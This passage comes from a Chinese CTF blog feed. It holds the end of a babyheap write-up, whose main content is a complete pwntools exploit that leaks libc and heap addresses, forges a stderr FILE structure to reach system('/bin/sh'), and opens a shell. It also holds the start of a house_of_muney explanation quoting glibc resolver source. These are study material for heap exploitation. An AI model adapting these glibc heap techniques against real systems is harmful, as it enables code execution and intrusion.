id="后续的攻击："><a href="#后续的攻击：" class="headerlink" title="后续的攻击："></a><strong>后续的攻击：</strong></h4><p>当然限制堆地址和libc地址都有了还需要进行劫持相关的操作，<strong>因为2.34之后没有相关的_malloc_hook等这些钩子了</strong>，所以一开始我的想法是house of kiwi，但是发现这个版本的 _IO_helper_jumps没有可写的权限。</p><p><img src="/2024/10/14/2024%E9%A2%86%E8%88%AA%E6%9D%AF-babyheap%E9%A2%98%E8%A7%A3/image-20241014175448192.png" alt="image-20241014175448192"></p><p>那么只好使用house of apple2 的相关连，house of cat（具体操作我前两篇博客里面有详细内容)，但是我这里是直接修改了 stderr结构体，没有直接进行伪造但是我发现一个弊端，这样的话有点极限因为，我们无法修改太多空间如果越界修改了stdout的话会导致程序卡住，所以我在这里卡半天，一直在调试，期间我也发现了，不同版本之间一些利用链的判断条件有所不同需要进行微调。</p><p>伪造指针的情况</p><p><img src="/2024/10/14/2024%E9%A2%86%E8%88%AA%E6%9D%AF-babyheap%E9%A2%98%E8%A7%A3/image-20241014180237314.png" alt="image-20241014180237314"></p><p><img src="/2024/10/14/2024%E9%A2%86%E8%88%AA%E6%9D%AF-babyheap%E9%A2%98%E8%A7%A3/image-20241014180305039.png" alt="image-20241014180305039"></p><p><img src="/2024/10/14/2024%E9%A2%86%E8%88%AA%E6%9D%AF-babyheap%E9%A2%98%E8%A7%A3/image-20241014180333563.png" alt="image-20241014180333563"></p><p>当然我是用的<strong>劫持tcache_ptheread_struct结构体</strong>来修改top_chunk和stderr的，因为我感觉largebin attack有点难操作，所以干脆之间修改stderr结构体了。</p><p>我是利用_malloc_assert来触发IO的，因为程序正常通过main函数返回所以也可以不用修改top_chunk，但是结构体要微调一些不然就这样了</p><p><img src="/2024/10/14/2024%E9%A2%86%E8%88%AA%E6%9D%AF-babyheap%E9%A2%98%E8%A7%A3/image-20241014181232689.png" alt="image-20241014181232689"></p><h4 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a><strong>EXP：</strong></h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br><br>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br><br>io = process(<span class="hljs-string">&quot;./babyheap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,msg</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;size:&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    io.sendlineafter(<span class="hljs-string">&quot;content:&quot;</span>,msg)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;index:&quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;index:&quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,msg</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;index:&quot;</span>,<span class="hljs-built_in">str</span>(index))<br>    io.sendafter(<span class="hljs-string">&quot;new content:&quot;</span>,msg)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&quot;5&quot;</span>)<br><br><br>add(<span class="hljs-number">0x418</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x1f8</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x448</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x438</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x208</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x418</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#5</span><br>add(<span class="hljs-number">0x428</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#6</span><br>add(<span class="hljs-number">0x208</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#7</span><br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">6</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>free(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#free(5)</span><br><br><span class="hljs-comment">#gdb.attach(io)</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x448</span> + <span class="hljs-string">b&#x27;\xb0\x10&#x27;</span><br>add(<span class="hljs-number">0x468</span>,payload)<br><span class="hljs-comment">#gdb.attach(io)</span><br>add(<span class="hljs-number">0x418</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x428</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x418</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br><br><br>free(<span class="hljs-number">6</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x418</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br><br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">5</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x418</span> + p64(<span class="hljs-number">0x431</span>)<br>add(<span class="hljs-number">0x500</span>,payload)<br>add(<span class="hljs-number">0x9f8</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span> + p64(<span class="hljs-number">0x10b0</span>)<br>edit(<span class="hljs-number">7</span>,payload)<br>free(<span class="hljs-number">5</span>)<br>add(<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br><br>show(<span class="hljs-number">4</span>)<br>io.recv(<span class="hljs-number">1</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21ace0</span><br>suc(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>IO_hleper_jumps = libc_base + <span class="hljs-number">0x216a00</span> <br>suc(<span class="hljs-string">&quot;IO_hleper_jumps&quot;</span>,IO_hleper_jumps)<br>IO_file_jumps = libc_base + <span class="hljs-number">0x217600</span> <br>stderr = libc_base + <span class="hljs-number">0x21b6a0</span><br>show(<span class="hljs-number">2</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>heap_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1770</span><br>suc(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)<br>top_chunk = heap_base + <span class="hljs-number">0x1140</span> <br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">9</span>)<br>free(<span class="hljs-number">7</span>)<br>key = (heap_base + <span class="hljs-number">0x1000</span>) &gt;&gt;  <span class="hljs-number">0xc</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xa50</span> + p64(<span class="hljs-number">0x340</span>) + p64(<span class="hljs-number">0x210</span>) + p64(heap_base+<span class="hljs-number">0x10</span> ^ key)<br>add(<span class="hljs-number">0xa70</span>,payload)<br><br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x07\x00&#x27;</span>*<span class="hljs-number">0x40</span>+p64(top_chunk)*<span class="hljs-number">20</span>+p64(stderr)*<span class="hljs-number">25</span>)<br>free(<span class="hljs-number">7</span>)<br>free(<span class="hljs-number">8</span>)<br>system = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>fake_io_addr = stderr<br><br>fake_IO_FILE = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="hljs-number">0x201</span>) +p64(<span class="hljs-number">0</span>) +p64(heap_base + <span class="hljs-number">0x200</span>)+p64(<span class="hljs-number">0</span>)  + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO_FILE +=p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rcx</span><br>fake_IO_FILE +=p64(fake_io_addr+<span class="hljs-number">0xb0</span>)<span class="hljs-comment">#_IO_backup_base=rdx -----&gt; setcontext + 61</span><br>fake_IO_FILE +=p64(system)<span class="hljs-comment">#_IO_save_end=call addr rax+0x58</span><br>fake_IO_FILE  =fake_IO_FILE.ljust(<span class="hljs-number">0x58</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE +=p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _chain</span><br>fake_IO_FILE  =fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_base+<span class="hljs-number">0x200</span>)  <span class="hljs-comment"># _lock = writable address</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE +=p64(fake_io_addr -<span class="hljs-number">0x20</span>) <span class="hljs-comment">#rax1</span><br>fake_IO_FILE += p64(fake_io_addr + <span class="hljs-number">0x40</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_io_addr + <span class="hljs-number">0x40</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(libc_base+<span class="hljs-number">0x2170c0</span>+<span class="hljs-number">0x10</span>-<span class="hljs-number">0x28</span>)  <span class="hljs-comment"># vtable=_IO_wfile_jumps+0x10</span><br>fake_IO_FILE += p64(<span class="hljs-number">0x00000000fbad2800</span>) +  p64(libc_base + <span class="hljs-number">0x21b803</span>)*<span class="hljs-number">5</span><br><span class="hljs-comment">#fake_IO_FILE += p64(fake_io_addr + 0x40) #rax2+0xe0</span><br><br><span class="hljs-comment">#add(0x500,&#x27;b&#x27;*8)</span><br><br>add(<span class="hljs-number">0x290</span>,fake_IO_FILE)<br>add(<span class="hljs-number">0xc0</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x300</span>))<br><br>io.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>io.sendlineafter(<span class="hljs-string">&quot;size:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x500</span>))<br><br><span class="hljs-comment">#gdb.attach(io)</span><br>io.interactive()<br></code></pre></td></tr></table></figure><p>最终效果</p><p><img src="/2024/10/14/2024%E9%A2%86%E8%88%AA%E6%9D%AF-babyheap%E9%A2%98%E8%A7%A3/image-20241014181406121.png" alt="image-20241014181406121"></p>]]></content>
    
    
    
    <tags>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>house_of_muney[CISCN]</title>
    <link href="/2024/10/10/house-of-muney-CISCN/"/>
    <url>/2024/10/10/house-of-muney-CISCN/</url>
    
    <content type="html"><![CDATA[<h2 id="house-of-muney"><a href="#house-of-muney" class="headerlink" title="house_of_muney"></a><strong>house_of_muney</strong></h2><p><strong>首先介绍一下house of muney 这个利用原理：</strong></p><p><strong>在了解过_dl_runtime_resolve的前提下，当程序保护开了延迟绑定的时候，程序第一次调用相关函数的时候会执行下面的命令</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">push</span> n<br><span class="hljs-keyword">push</span> ModuleID<br><span class="hljs-symbol">jmp</span> _dl_runtime_resolve<br></code></pre></td></tr></table></figure><p><strong>这里的<code>n</code>对应的是这个符号在<code>rel.plt</code>重定位表中的下标然后第二个<code>MoudleID</code>则一般是本程序的<code>link_map</code>结构体的地址，解析来就进入到了<code>_dl_runtime_resolve</code>函数</strong> </p><p><strong>我们来看看这个函数做了什么</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* This function is called through a special trampoline from the PLT the first time each PLT entry is called.  We must perform the relocation specified in the PLT of the given shared object, and return the resolved function address to the trampoline, which will restart the original call to that address.Future calls will bounce directly from the PLT to the</span><br><span class="hljs-comment">   function.  */</span><br><br>DL_FIXUP_VALUE_TYPE<br>attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE<br>_dl_fixup (<br><span class="hljs-meta"># <span class="hljs-keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br>   ELF_MACHINE_RUNTIME_FIXUP_ARGS,<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br>   <span class="hljs-keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *<span class="hljs-type">const</span> symtab<br>    = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *strtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);<br><br>  <span class="hljs-type">const</span> PLTREL *<span class="hljs-type">const</span> reloc<br>    = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);<br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];<br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *refsym = sym;<br>  <span class="hljs-type">void</span> *<span class="hljs-type">const</span> rel_addr = (<span class="hljs-type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);<br>  <span class="hljs-type">lookup_t</span> result;<br>  DL_FIXUP_VALUE_TYPE value;<br><br>  <span class="hljs-comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span><br>  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);<br><br>   <span class="hljs-comment">/* Look up the target symbol.  If the normal lookup rules are not</span><br><span class="hljs-comment">      used don&#x27;t look in the global scope.  */</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_found_version</span> *<span class="hljs-title">version</span> =</span> <span class="hljs-literal">NULL</span>;<br><br>      <span class="hljs-keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Half)</span> *vernum =<br>    (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);<br>  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="hljs-number">0x7fff</span>;<br>  version = &amp;l-&gt;l_versions[ndx];<br>  <span class="hljs-keyword">if</span> (version-&gt;hash == <span class="hljs-number">0</span>)<br>    version = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>      <span class="hljs-comment">/* We need to keep the scope around so do some locking.  This is</span><br><span class="hljs-comment"> not necessary for objects which cannot be unloaded or when</span><br><span class="hljs-comment"> we are not using any threads (yet).  */</span><br>      <span class="hljs-type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;<br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>&#123;<br>  THREAD_GSCOPE_SET_FLAG ();<br>  flags |= DL_LOOKUP_GSCOPE_LOCK;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span><br>      RTLD_ENABLE_FOREIGN_CALL;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,<br>    version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<br><br>      <span class="hljs-comment">/* We are done with the global scope.  */</span><br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>THREAD_GSCOPE_RESET_FLAG ();<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span><br>      RTLD_FINALIZE_FOREIGN_CALL;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>      <span class="hljs-comment">/* Currently result contains the base load address (or link map)</span><br><span class="hljs-comment"> of the object that defines sym.  Now add in the symbol</span><br><span class="hljs-comment"> offset.  */</span><br>      value = DL_FIXUP_MAKE_VALUE (result,<br>   SYMBOL_ADDRESS (result, sym, <span class="hljs-literal">false</span>));<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-comment">/* We already found the symbol.  The module (and therefore its load</span><br><span class="hljs-comment"> address) is also known.  */</span><br>      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="hljs-literal">true</span>));<br>      result = l;<br>    &#125;<br><br>  <span class="hljs-comment">/* And now perhaps the relocation addend.  */</span><br>  value = elf_machine_plt_value (l, reloc, value);<br><br>  <span class="hljs-keyword">if</span> (sym != <span class="hljs-literal">NULL</span><br>      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="hljs-number">0</span>))<br>    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));<br><br>  <span class="hljs-comment">/* Finally, fix up the plt itself.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))<br>    <span class="hljs-keyword">return</span> value;<br><br>  <span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>可以看见又继续调用<code>_dl_lookup_symbol_x</code>这个函数 ，它会开始在link_map寻找符号，实际上调用了<code>do_lookup_x</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c">* Inner part of the lookup functions.  We <span class="hljs-keyword">return</span> a value &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> we<br>   found the symbol, the value <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> nothing is found and &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">if</span><br>   something bad happened.  */<br><span class="hljs-type">static</span> <span class="hljs-type">int</span><br>__attribute_noinline__<br>do_lookup_x (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *undef_name, <span class="hljs-type">uint_fast32_t</span> new_hash,<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *old_hash, <span class="hljs-type">const</span> ElfW(Sym) *ref,<br>     <span class="hljs-keyword">struct</span> sym_val *result, <span class="hljs-keyword">struct</span> r_scope_elem *scope, <span class="hljs-type">size_t</span> i,<br>     <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> r_found_version *<span class="hljs-type">const</span> version, <span class="hljs-type">int</span> flags,<br>     <span class="hljs-keyword">struct</span> link_map *skip, <span class="hljs-type">int</span> type_class, <span class="hljs-keyword">struct</span> link_map *undef_map)<br>&#123;<br>  <span class="hljs-type">size_t</span> n = scope-&gt;r_nlist;<br>  <span class="hljs-comment">/* Make sure we read the value before proceeding.  Otherwise we</span><br><span class="hljs-comment">     might use r_list pointing to the initial scope and r_nlist being</span><br><span class="hljs-comment">     the value after a resize.  That is the only path in dl-open.c not</span><br><span class="hljs-comment">     protected by GSCOPE.  A read barrier here might be to expensive.  */</span><br>  __asm <span class="hljs-title function_">volatile</span> <span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;+r&quot;</span> (n), <span class="hljs-string">&quot;+m&quot;</span> (scope-&gt;r_list))</span>;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> **<span class="hljs-title">list</span> =</span> scope-&gt;r_list;<br><br>  <span class="hljs-keyword">do</span><br>    &#123;<br>      <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">map</span> =</span> <span 